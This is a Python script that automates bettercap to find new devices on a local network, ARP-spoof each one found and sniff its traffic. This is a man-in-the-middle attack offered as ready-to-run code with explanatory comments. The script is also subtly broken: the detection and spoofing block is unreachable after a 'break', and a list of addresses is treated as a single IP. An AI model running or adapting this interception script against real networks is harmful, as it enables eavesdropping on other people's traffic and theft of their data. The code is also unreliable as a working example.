import subprocess #Allows the running of other programs or commands from the code
import re #used for analyzing output string 

def run_bettercap():
    global found_ip_flag

    try:
        #more commands can be added, just seperate them with a comma
        commands = [
            "net.probe on"
        ]
        
        #sudo bettercap -eval '{}' runs bettercap with administrative privileges and allows a series
        #of commands to be executed as soon as bettercap starts
        #The commands are joined together by ; which are command seperators in bettercap
        cmd = "sudo bettercap -eval '{}'".format("; ".join(commands))
        
        #execute command in the subprocess
        #Pass in the commands, run the commands through the shell, redirect the output to Pyton variables, treat output as text (string format) 
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        #Monitor the output of the subprocess
        while True:
            output = process.stdout.readline() #read one line from the output of the subprocess 
            if output == '' and process.poll() is not None: #if there is an empty string and if the subprocess returns a value other than None, indicating the subprocess has terminated
                break
                if not found_ip_flag: #checks if output has any data
                    print(output.strip()) #prints the output after removing any trailing whitespace
                    ip = extract_info(output) #parses and extracts useful information

                    if ip:
                        arp_spoofing(ip)
                        found_ip_flag = True

            if found_ip_flag:
                sniffing()

    except Exception as e:
        print(f"Error with running Bettercap {e}")
    
    finally:
        if process: #terminate the process when done
            process.terminate()
            
def extract_info(output):
    
    global device_ip, found_ip_flag
    
    if "endpoint.new" in output: #endpoint.new is an event that happens when a new device connects to the network/becomes active
        ip_pattern = r'[0-9]+(?:\.[0-9]+){3}'
        found_ip = re.findall(ip_pattern, output)
        
        if found_ip and found_ip != device_ip:
            print(f"IP found {found_ip}")
            found_ip_flag = True
            return found_ip
        
    
def arp_spoofing(target_ip):
    
    global interface
    
    commands = [
        f"set arp.spoof.interface {interface}",
        f"set arp.spoof.targets {target_ip}",
        "arp.spoof on",
    ]
    update_command = "sudo bettercap -eval '" + "; ".join(commands) + "'"
    
    try:
        subprocess.run(update_command, shell=True)
        print(f"ARP Spoofing started for {target_ip}")
    except Exception as e:
        print(f"Error setting ARP Spoofing: {e}")

def sniffing():
    sniff_command = ["net.sniff on"]
    update_command = "sudo bettercap -eval '" + "; ".join(sniff_command) + "'"

    try:
        subprocess.run(update_command, shell=True)
        print("Started sniffing")
    except Exception as e:
        print(f"Error with sniffing: {e}")

#--------------------------
device_ip = '169.254.62.118'
interface = 'eth0'
found_ip_flag = False
run_bettercap()
        